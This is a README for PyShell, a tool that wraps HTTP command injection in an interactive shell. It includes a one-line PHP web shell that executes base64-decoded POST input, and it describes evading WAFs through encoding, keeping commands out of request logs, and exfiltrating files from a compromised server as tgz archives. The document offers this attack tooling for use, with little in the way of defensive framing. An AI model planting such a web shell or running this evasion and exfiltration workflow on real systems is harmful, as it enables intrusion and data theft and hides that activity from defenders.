# PyShell - Shellify Your HTTP Command Injection!

This fork of PyShell allows PyShell to be reused for arbitrary HTTP command injection
situations, not just PHP. Simply write the request code, import and initialize a PyShell
object, and pass it your function. Then, all of the existing PyShell magic will work for
you!

Firewall got you down? Are your reverse-shell connection attempts being
filtered? Are you stuck working solely over HTTP / HTTPS? Then this just might
be just the thing for you.

PyShell exists to make interacting with web-based command injection less
painful. The goal is to make it feel as much like an interactive shell as
possible. Commands are base-64 encoded to help deal with WAFs, and are submitted
as POST requests to be less visible in request logs.

For the example PHP shell, usage is `python3 pyshell-php.py URL` where URL points to a script which performs
the command injection, something like this:

```
<?php $r=base64_decode($_POST['cmd']).' '.base64_decode($_POST['opts']); echo `$r` ?>
```

The server-side script should accept the following parameters:
 - `cmd`: the command to be run, base64 encoded
 - `opts`: the options to provide to cmd, also base64 encoded
 - `[timeout]`: optional, denotes the number of seconds to wait for a command

## USAGE DEMO:

## COOL FEATURES:
 - Basic command history (up arrow / down arrow to navigate).
 - Navigate directory tree with `cd [target]` pseudo-command.
 - Exfiltrate files or folders via `get [target]` pseudo-command.
 - Tab completion. (whoa!)

## KNOWN ISSUES:
 - Trying to `cd` into a non-existent directory is not prevented

## MISC NOTES:
Note that you only get output when the command you run exits. Interactive
commands are also unsupported, for reasons that should be obvious -- although if
you ever forget why while using PyShell, we'll consider that a success!

To change the timeout parameter passed with each command, run `settimeout n`. It
defaults to 20. Unless you handle the timeout parameter server side, it does
exactly nothing.

Your command-history is located in `~/.pyshellhistory`.

When exfiltrating data, a tgz file will be created in the `downloads`
subdirectory (which will be created as needed). If you do not have permission to
read a file, the file will simply be omitted in the downloaded archive.
